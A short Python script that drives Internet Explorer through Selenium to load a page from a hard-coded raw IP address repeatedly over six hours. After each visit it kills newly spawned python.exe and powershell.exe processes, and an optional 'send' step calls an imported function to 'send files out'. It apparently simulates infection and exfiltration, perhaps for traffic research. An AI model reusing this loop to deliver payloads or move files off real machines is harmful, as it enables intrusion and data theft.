from selenium import webdriver
import random
import time
import os
import psutil
from normal_file import send_files_with_delay
import sys

def kill_automatic_start_cmd(cur_time):
    process_list = psutil.pids()

    max_time = 0
    kill_proc = None
    for proc in psutil.process_iter():
        pidDictionary = psutil.Process(proc.pid).as_dict(attrs=['pid', 'name', 'username', 'exe', 'create_time']);
        tempText=''
        if 'python.exe' in pidDictionary['name']:
            for keys in pidDictionary.keys():
                tempText += keys + ':' + str(pidDictionary[keys]) + '--'
            print(tempText)
            if pidDictionary['create_time'] > max_time:
                max_time = pidDictionary['create_time']
                kill_proc = proc

    print(max_time, kill_proc.pid)
    if max_time > cur_time:
        kill_proc.kill()
            


start_time = time.time()
iedriver = None
i = 0

while time.time() < start_time + 6*60*60:
    print(i)
    i = i + 1
    iedriver=webdriver.Ie()
    cur_time = time.time()
    iedriver.get('http://47.92.125.214/mytest1')
    # time.sleep(5)
    # iedriver.get("javascript:document.getElementById('overridelink').click();")
    time.sleep(10* 60)
    
    print("Close IE")
    iedriver.quit()
    print("Kill Powershell")
    kill_automatic_start_cmd(cur_time)
    os.system('taskkill /F /IM powershell.exe')
    sleep_duration = random.randint(10, 60)*60
    print("sleep duration:", str(sleep_duration))
    time.sleep(sleep_duration)

if sys.argv[1] == 'send':
    print("send files out")
    send_files_with_delay()


        